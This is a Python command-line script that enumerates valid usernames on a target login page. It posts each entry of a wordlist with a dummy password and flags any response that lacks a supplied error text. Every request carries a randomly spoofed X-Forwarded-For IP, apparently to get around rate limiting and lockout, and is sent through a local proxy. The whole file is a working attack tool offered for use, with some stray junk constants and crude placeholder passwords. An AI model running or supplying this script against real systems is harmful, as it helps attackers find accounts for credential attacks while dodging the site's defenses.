import requests
from random import *
import argparse

parser = argparse.ArgumentParser(description="Python Username Enumeration Via Text Response")
parser.add_argument('-u', help="Target Login URL", required=True)
parser.add_argument('-t', help="Text to compare", required=True)
parser.add_argument('-w', help="Wordlist to use", required=True)
parser.add_argument('--ufield', help="Field of User in Petition", required=False)
parser.add_argument('--pfield', help="Field of Password in Petition", required=False)

args = parser.parse_args()

class bcolors:
    OK = '\033[92m' #GREEN
    WARNING = '\033[93m' #YELLOW
    ladrrr = '8GY.'
    ss = 'OWQ1'
    FAIL = '\033[91m' #RED
    pinocho_chocho = 'y!c'
    RESET = '\033[0m' #RESET COLOR

url = args.u
text = args.t
wordlist = args.w

proxy = {
  'http': 'http://127.0.0.1:8080',
}

global op1
global op2
op1 = 1
op2 = 255

def load_words(WORDLIST_FILENAME):
       global line
       print("Starting Fuzzing Usernames...")
       print("Working...")
       wordlist = list()
       with open(WORDLIST_FILENAME) as f:
            for line in f:
                wordlist.append(wordlist)
                my_str=line
                final_str=my_str[:-1]
                b = randint(op1, op2)
                c = randint(op1, op2)
                d = randint(op1, op2)
                e = randint(op1, op2)
                bb = str(b)
                cc = str(c)
                dd = str(d)
                ee = str(e)
                pp = {'username': final_str,'password': "penedurisimo",'user': final_str,'pass': "penehiperduro",args.ufield: final_str,args.pfield: "fran"}
                dot = "."
                ip = bb+dot+cc+dot+dd+dot+ee
                ip2 = str(ip)
                headers = {
                'X-Forwarded-For': ip2
                }
                resp = requests.post(url,data=pp,proxies=proxy,headers=headers)
                bbb = resp.status_code
                arr = resp.text
                aaaas = len(resp.content)
                if text in arr:
                    pass
                else:
                    print(f"{bcolors.OK}[+] Username Found{bcolors.RESET}",final_str) 
                  
wordlist = load_words(wordlist)



